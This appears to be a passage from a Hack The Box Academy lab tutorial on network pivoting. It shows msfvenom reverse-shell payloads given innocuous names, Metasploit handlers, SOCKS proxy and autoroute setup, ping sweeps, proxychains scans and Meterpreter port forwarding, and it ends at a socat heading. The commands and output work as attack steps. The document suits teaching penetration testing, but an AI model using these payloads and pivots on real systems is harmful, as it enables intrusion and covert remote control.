<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">[*] Started HTTPS reverse handler on https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>
[!] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span> handling request from <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span><span class="hljs-comment">; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!</span>
[*] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span> handling request from <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span><span class="hljs-comment">; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...</span>
[!] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span> handling request from <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span><span class="hljs-comment">; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8000</span> -&gt; <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span> ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">02</span> <span class="hljs-number">10</span>:<span class="hljs-number">48</span>:<span class="hljs-number">10</span> -<span class="hljs-number">0500</span>

meterpreter &gt; shell
Process <span class="hljs-number">3236</span> created.
Channel <span class="hljs-number">1</span> created.
Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-meta">.17763</span><span class="hljs-meta">.1637</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.
<span class="hljs-symbol">
C:</span>\&gt;
</code></pre>
<p>Our Meterpreter session should list that our incoming connection is from a local host itself (<code>127.0.0.1</code>) since we are receiving the connection over the <code>local SSH socket</code>, which created an <code>outbound</code> connection to the Ubuntu server. Issuing the <code>netstat</code> command can show us that the incoming connection is from the SSH service.</p>
<p>The below graphical representation provides an alternative way to understand this technique.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/44.png" alt=""></p>
<p>In addition to answering the challenge questions, practice this technique and try to obtain a reverse shell from the Windows target.</p>
<p>\</p>
<h2 id="meterpreter-tunneling-port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</h2>
<hr>
<p>Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port <code>8080</code>.</p>
<p><strong>Creating Payload for Ubuntu Pivot Host</strong></p>
<pre><code class="lang-shell-session">[!<span class="hljs-keyword">bash!]$ </span>msfvenom -p linux/x64/meterpreter/<span class="hljs-keyword">reverse_tcp </span>LHOST<span class="hljs-number">=10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">18</span> -f elf -o <span class="hljs-keyword">backupjob </span>LPORT<span class="hljs-number">=8080</span>

[-] No platform was <span class="hljs-keyword">selected, </span>choosing Msf::Module::Platform::Linux from the payload
[-] No arch <span class="hljs-keyword">selected, </span><span class="hljs-keyword">selecting </span>arch: x64 from the payload
<span class="hljs-symbol">No</span> encoder specified, outputting raw payload
<span class="hljs-symbol">Payload</span> size: <span class="hljs-number">130</span> <span class="hljs-keyword">bytes
</span><span class="hljs-symbol">Final</span> size of elf file: <span class="hljs-number">250</span> <span class="hljs-keyword">bytes
</span><span class="hljs-symbol">Saved</span> as: <span class="hljs-keyword">backupjob</span>
</code></pre>
<p>Before copying the payload over, we can start a <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi/handler</a>, also known as a Generic Payload Handler.</p>
<p><strong>Configuring &amp; Starting the multi/handler</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; use exploit/multi/handler

[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; <span class="hljs-keyword">set</span> lhost <span class="hljs-comment">0.0.0.0</span>
lhost <span class="hljs-comment">=&gt; 0.0.0.0</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; set lport <span class="hljs-number">8080</span>
lport =&gt; <span class="hljs-number">8080</span>
msf6 exploit(multi/<span class="hljs-comment">handler) &gt; set payload linux</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp
payload =&gt; linux/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; run
[*] Started reverse TCP handler on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8080</span>
</code></pre>
<p>We can copy the <code>backupjob</code> binary file to the Ubuntu pivot host <code>over SSH</code> and execute it to gain a Meterpreter session.</p>
<p><strong>Executing the Payload on the Pivot Host</strong></p>
<pre><code class="lang-shell-session">ubuntu<span class="hljs-variable">@WebServer</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls

backupjob
ubuntu<span class="hljs-variable">@WebServer</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +x backupjob 
ubuntu<span class="hljs-variable">@WebServer</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./backupjob
</code></pre>
<p>We need to make sure the Meterpreter session is successfully established upon executing the payload.</p>
<p><strong>Meterpreter Session Establishment</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Sending stage (<span class="hljs-name">3020772</span> bytes) to <span class="hljs-number">10.129</span>.202.64
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-name">10.10.14.18:8080</span> -&gt; <span class="hljs-number">10.129</span>.202.64:39826 ) at <span class="hljs-number">2022</span><span class="hljs-number">-03</span><span class="hljs-number">-03</span> <span class="hljs-number">12</span>:27:43 <span class="hljs-number">-0500</span>
meterpreter &gt; pwd

/home/ubuntu
</code></pre>
<p>We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the <code>ping_sweep</code> module, which will generate the ICMP traffic from the Ubuntu host to the network <code>172.16.5.0/23</code>.</p>
<p><strong>Ping Sweep</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=<span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.0</span>/<span class="hljs-number">23</span>

[*] Performing ping sweep for IP range <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.0</span>/<span class="hljs-number">23</span>
</code></pre>
<p>We could also perform a ping sweep using a <code>for loop</code> directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.</p>
<p><strong>Ping Sweep For Loop on Linux Pivot Hosts</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..254} ;<span class="hljs-keyword">do</span> (ping -c 1 172.16.5.<span class="hljs-variable">$i</span> | grep <span class="hljs-string">"bytes from"</span> &amp;) ;<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>Ping Sweep For Loop Using CMD</strong></p>
<pre><code class="lang-cmd-session">for /L %i in (<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">254</span>) do ping <span class="hljs-number">172.16</span><span class="hljs-number">.5</span>.%i -n <span class="hljs-number">1</span> -w <span class="hljs-number">100</span> | find <span class="hljs-string">"Reply"</span>
</code></pre>
<p><strong>Ping Sweep Using PowerShell</strong></p>
<pre><code class="lang-powershell-session"><span class="hljs-number">1.</span><span class="hljs-number">.254</span> | <span class="hljs-type">% {"172</span><span class="hljs-number">.16</span><span class="hljs-number">.5</span>.$($<span class="hljs-keyword">_</span>): $(<span class="hljs-keyword">Test</span>-Connection -count <span class="hljs-number">1</span> -comp <span class="hljs-number">172.15</span><span class="hljs-number">.5</span>.$($<span class="hljs-keyword">_</span>) -quiet)<span class="hljs-string">"}</span>
</code></pre>
<p>Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it&#39;s arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.</p>
<p>There could be scenarios when a host&#39;s firewall blocks ping (ICMP), and the ping won&#39;t get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit&#39;s post-exploitation routing module <code>socks_proxy</code> to configure a local proxy on our attack host. We will configure the SOCKS proxy for <code>SOCKS version 4a</code>. This SOCKS configuration will start a listener on port <code>9050</code> and route all the traffic received via our Meterpreter session.</p>
<p><strong>Configuring MSF&#39;s SOCKS Proxy</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) &gt; <span class="hljs-keyword">set</span> SRVPORT <span class="hljs-comment">9050</span>
SRVPORT <span class="hljs-comment">=&gt; 9050</span>
msf6 <span class="hljs-comment">auxiliary(server</span>/socks_proxy) &gt; set SRVHOST <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
SRVHOST =&gt; <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
msf6 auxiliary(server/<span class="hljs-comment">socks_proxy) &gt; set version 4a</span>
version <span class="hljs-comment">=&gt; 4a</span>
msf6 <span class="hljs-comment">auxiliary(server</span>/socks_proxy) &gt; run
[*] Auxiliary module running as background job <span class="hljs-number">0.</span>

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/<span class="hljs-comment">socks_proxy) &gt; options</span>

Module <span class="hljs-comment">options (auxiliary</span>/server/<span class="hljs-comment">socks_proxy):</span>

   Name     <span class="hljs-comment">Current Setting  Required  Description</span>
   ----     ---------------  --------  -----------
   SRVHOST  <span class="hljs-comment">0.0.0.0          yes       The address to listen on</span>
   SRVPORT  <span class="hljs-comment">9050             yes       The port to listen on</span>
   VERSION  <span class="hljs-comment">4a               yes       The SOCKS version to use (Accepted: 4a,</span>
                                        5)


Auxiliary <span class="hljs-comment">action:</span>

   Name   <span class="hljs-comment">Description</span>
   ----   -----------
   Proxy  <span class="hljs-comment">Run a SOCKS proxy server</span>
</code></pre>
<p><strong>Confirming Proxy Server is Running</strong></p>
<pre><code class="lang-shell-session">msf6 auxiliary(server/socks<span class="hljs-emphasis">_proxy) &gt; jobs

</span><span class="hljs-section">Jobs
====</span>

<span class="hljs-code">  Id  Name                           Payload  Payload opts</span>
<span class="hljs-code">  --  ----                           -------  ------------</span>
<span class="hljs-code">  0   Auxiliary: server/socks_proxy</span>
</code></pre>
<p>After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our <code>proxychains.conf</code> file located at <code>/etc/proxychains.conf</code> if it isn&#39;t already there.</p>
<p><strong>Adding a Line to proxychains.conf if Needed</strong></p>
<pre><code class="lang-shell-session">socks4     <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9050</span>
</code></pre>
<p>Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.</p>
<p>Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the <code>post/multi/manage/autoroute</code> module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.</p>
<p><strong>Creating Routes with AutoRoute</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) &gt; <span class="hljs-keyword">set</span> SESSION <span class="hljs-number">1</span>
SESSION =&gt; <span class="hljs-number">1</span>
msf6 post(multi/manage/autoroute) &gt; <span class="hljs-keyword">set</span> SUBNET <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.0</span>
SUBNET =&gt; <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.0</span>
msf6 post(multi/manage/autoroute) &gt; run

[!] SESSION may <span class="hljs-keyword">not</span> be compatible <span class="hljs-keyword">with</span> this <span class="hljs-keyword">module</span>:
[!]  * incompatible session platform: linux
[*] Running <span class="hljs-keyword">module</span> against <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
[*] Searching <span class="hljs-keyword">for</span> subnets <span class="hljs-keyword">to</span> autoroute.
[+] Route added <span class="hljs-keyword">to</span> subnet <span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-keyword">from</span> host<span class="hljs-comment">'s routing table.</span>
[+] Route added <span class="hljs-keyword">to</span> subnet <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-number">.254</span><span class="hljs-number">.0</span> <span class="hljs-keyword">from</span> host<span class="hljs-comment">'s routing table.</span>
[*] Post <span class="hljs-keyword">module</span> execution completed
</code></pre>
<p>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.</p>
<pre><code class="lang-shell-session">meterpreter &gt; run autoroute -s <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span>/<span class="hljs-number">23</span>

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute <span class="hljs-meta">OPTION</span>=value [...]
[*] Adding a route to <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span>...
[+] Added route to <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span> via <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span>
[*] Use the -p <span class="hljs-meta">option</span> to list all active routes
</code></pre>
<p>After adding the necessary route(s) we can use the <code>-p</code> option to list the active routes to make sure our configuration is applied as expected.</p>
<p><strong>Listing Active Routes with AutoRoute</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute <span class="hljs-meta">OPTION</span>=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   <span class="hljs-number">10.129</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>        Session <span class="hljs-number">1</span>
   <span class="hljs-number">172.16</span><span class="hljs-meta">.4</span><span class="hljs-meta">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span>      Session <span class="hljs-number">1</span>
   <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span>      Session <span class="hljs-number">1</span>
</code></pre>
<p>As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.</p>
<p><strong>Testing Proxy &amp; Routing Functionality</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ proxychains nmap <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> -p3389 -<span class="hljs-built_in">sT</span> -v -Pn

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">'up'</span> <span class="hljs-keyword">and</span> scan <span class="hljs-built_in">times</span> may be slower.
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span> <span class="hljs-number">13</span>:<span class="hljs-number">40</span> EST
Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">40</span>
Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">40</span>, <span class="hljs-number">0.</span>12s elapsed
Initiating Connect Scan <span class="hljs-meta">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">40</span>
Scanning <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> [<span class="hljs-number">1</span> port]
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> :<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
Discovered open port <span class="hljs-number">3389</span>/tcp on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
Completed Connect Scan <span class="hljs-meta">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">40</span>, <span class="hljs-number">0.</span>12s elapsed (<span class="hljs-number">1</span> total ports)
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> 
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>12s latency).

PORT     STATE SERVICE
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.45</span> seconds
</code></pre>
<hr>
<h3 id="port-forwarding">Port Forwarding</h3>
<p>Port forwarding can also be accomplished using Meterpreter&#39;s <code>portfwd</code> module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.</p>
<p><strong>Portfwd options</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; <span class="hljs-keyword">help</span> portfwd

Usage: portfwd [-h] [<span class="hljs-built_in">add</span> | <span class="hljs-keyword">delete</span> | <span class="hljs-keyword">list</span> | flush] [<span class="hljs-keyword">args</span>]


OPTIONS:

    -h        Help banner.
    -i <span class="hljs-symbol">&lt;opt&gt;</span>  Index of the port forward entry <span class="hljs-keyword">to</span> interact with (see the <span class="hljs-string">"list"</span> <span class="hljs-keyword">command</span>).
    -<span class="hljs-keyword">l</span> <span class="hljs-symbol">&lt;opt&gt;</span>  Forward: local port <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. Reverse: local port <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
    -L <span class="hljs-symbol">&lt;opt&gt;</span>  Forward: local host <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span> (optional). Reverse: local host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
    -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;opt&gt;</span>  Forward: remote port <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>. Reverse: remote port <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.
    -r <span class="hljs-symbol">&lt;opt&gt;</span>  Forward: remote host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
    -R        Indicates <span class="hljs-keyword">a</span> <span class="hljs-built_in">reverse</span> port forward.
</code></pre>
<p><strong>Creating Local TCP Relay</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">portfwd</span> <span class="hljs-selector-tag">add</span> <span class="hljs-selector-tag">-l</span> 3300 <span class="hljs-selector-tag">-p</span> 3389 <span class="hljs-selector-tag">-r</span> 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.19</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Local</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">relay</span> <span class="hljs-selector-tag">created</span>: <span class="hljs-selector-pseudo">:3300</span> &lt;<span class="hljs-selector-tag">-</span>&gt; 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.19</span><span class="hljs-selector-pseudo">:3389</span>
</code></pre>
<p>The above command requests the Meterpreter session to start a listener on our attack host&#39;s local port (<code>-l</code>) <code>3300</code> and forward all the packets to the remote (<code>-r</code>) Windows server <code>172.16.5.19</code> on <code>3389</code> port (<code>-p</code>) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.</p>
<p><strong>Connecting to Windows Target through localhost</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ xfreerdp <span class="hljs-regexp">/v:localhost:3300 /</span><span class="hljs-string">u:</span>victor /<span class="hljs-string">p:</span>pass@<span class="hljs-number">123</span>
</code></pre>
<p><strong>Netstat Output</strong></p>
<p>We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.</p>
<pre><code class="lang-shell-session">[!bash!]$ netstat -antp

tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">54652</span>         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">3300</span>          ESTABLISHED <span class="hljs-number">4075</span>/xfreerdp
</code></pre>
<hr>
<h3 id="meterpreter-reverse-port-forwarding">Meterpreter Reverse Port Forwarding</h3>
<p>Similar to local port forwards, Metasploit can also perform <code>reverse port forwarding</code> with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port <code>1234</code> to our listener on port <code>8081</code>.</p>
<p>We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port <code>1234</code> running on the Ubuntu server to our attack host on local port (<code>-l</code>) <code>8081</code>. We will also configure our listener to listen on port 8081 for a Windows shell.</p>
<p><strong>Reverse Port Forwarding Rules</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">portfwd</span> <span class="hljs-selector-tag">add</span> <span class="hljs-selector-tag">-R</span> <span class="hljs-selector-tag">-l</span> 8081 <span class="hljs-selector-tag">-p</span> 1234 <span class="hljs-selector-tag">-L</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Local</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">relay</span> <span class="hljs-selector-tag">created</span>: 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span><span class="hljs-selector-pseudo">:8081</span> &lt;<span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-pseudo">:1234</span>
</code></pre>
<p><strong>Configuring &amp; Starting multi/handler</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">meterpreter</span> &gt; <span class="hljs-keyword">bg
</span>
[*] <span class="hljs-keyword">Backgrounding </span>session <span class="hljs-number">1</span>...
<span class="hljs-symbol">msf6</span> exploit(<span class="hljs-keyword">multi/handler) </span>&gt; set payload windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp
</span><span class="hljs-symbol">payload</span> =&gt; windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp
</span><span class="hljs-symbol">msf6</span> exploit(<span class="hljs-keyword">multi/handler) </span>&gt; set LPORT <span class="hljs-number">8081</span> 
<span class="hljs-symbol">LPORT</span> =&gt; <span class="hljs-number">8081</span>
<span class="hljs-symbol">msf6</span> exploit(<span class="hljs-keyword">multi/handler) </span>&gt; set LHOST <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> 
<span class="hljs-symbol">LHOST</span> =&gt; <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>
<span class="hljs-symbol">msf6</span> exploit(<span class="hljs-keyword">multi/handler) </span>&gt; run

[*] Started <span class="hljs-keyword">reverse </span>TCP handler on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">8081</span>
</code></pre>
<p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on <code>172.16.5.129</code>:<code>1234</code> when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to <code>attack host&#39;s ip</code>:<code>8081</code> that we configured.</p>
<p><strong>Generating the Windows Payload</strong></p>
<pre><code class="lang-shell-session">[!<span class="hljs-keyword">bash!]$ </span>msfvenom -p windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp </span>LHOST<span class="hljs-number">=172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">5</span>.<span class="hljs-number">129</span> -f exe -o <span class="hljs-keyword">backupscript.exe </span>LPORT<span class="hljs-number">=1234</span>

[-] No platform was <span class="hljs-keyword">selected, </span>choosing Msf::Module::Platform::Windows from the payload
[-] No arch <span class="hljs-keyword">selected, </span><span class="hljs-keyword">selecting </span>arch: x64 from the payload
<span class="hljs-symbol">No</span> encoder specified, outputting raw payload
<span class="hljs-symbol">Payload</span> size: <span class="hljs-number">510</span> <span class="hljs-keyword">bytes
</span><span class="hljs-symbol">Final</span> size of exe file: <span class="hljs-number">7168</span> <span class="hljs-keyword">bytes
</span><span class="hljs-symbol">Saved</span> as: <span class="hljs-keyword">backupscript.exe</span>
</code></pre>
<p>Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.</p>
<p><strong>Establishing the Meterpreter session</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> 0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:8081</span> 
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (200262 <span class="hljs-selector-tag">bytes</span>) <span class="hljs-selector-tag">to</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> 2 <span class="hljs-selector-tag">opened</span> (10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span><span class="hljs-selector-pseudo">:8081</span> <span class="hljs-selector-tag">-</span>&gt; 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span><span class="hljs-selector-pseudo">:40173</span> ) <span class="hljs-selector-tag">at</span> 2022<span class="hljs-selector-tag">-03-04</span> 15<span class="hljs-selector-pseudo">:26</span><span class="hljs-selector-pseudo">:14</span> <span class="hljs-selector-tag">-0500</span>

<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">shell</span>
<span class="hljs-selector-tag">Process</span> 2336 <span class="hljs-selector-tag">created</span>.
<span class="hljs-selector-tag">Channel</span> 1 <span class="hljs-selector-tag">created</span>.
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-attr">[Version 10.0.17763.1637]</span>
(<span class="hljs-selector-tag">c</span>) 2018 <span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Corporation</span>. <span class="hljs-selector-tag">All</span> <span class="hljs-selector-tag">rights</span> <span class="hljs-selector-tag">reserved</span>.

<span class="hljs-selector-tag">C</span>:\&gt;
</code></pre>
<h2 id="socat-redirection-with-a-reverse-shell">Socat Redirection with a Reverse Shell</h2>
<p><a href="https://linux.die.net/man/1/socat">Socat</a> is a bidirectional relay tool that can create pipe sockets between <code>2</code> independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit&#39;s listener using the same command mentioned in the last section on our attack host, and we can start <code>socat</code> on the Ubuntu server.</p>
<p><strong>Starting Socat Listener</strong></p>
<p>Socat Redirection with a Reverse Shell</p>
